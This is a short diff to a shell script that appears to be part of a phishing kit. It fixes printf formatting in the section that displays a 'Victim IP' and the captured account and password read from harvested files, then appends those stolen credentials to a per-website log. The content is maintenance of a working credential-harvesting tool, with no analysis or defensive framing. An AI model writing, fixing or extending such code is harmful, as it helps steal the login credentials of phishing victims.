@@ -309,7 +309,7 @@ ip=$(grep -a 'IP:' .htr/www/ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
 
 printf "\n"
-printf "  Victim IP: \n" $ip
+printf "  Victim IP: %s " $ip
 printf "\n"
 printf "  Saved: ip.txt\n" $server
 printf "\n"
@@ -323,7 +323,7 @@ account=$(grep -o 'Username:.*' .htr/www/usernames.txt | cut -d " " -f2)
 IFS=$'\n'
 password=$(grep -o 'Pass:.*' .htr/www/usernames.txt | cut -d ":" -f2)
 printf "\n"
-printf "    Account: %s" $account
+printf "  Account: %s" $account
 printf "\n"
 printf "  Password: %s" $password
 cat .htr/www/usernames.txt >> logs/$website.log
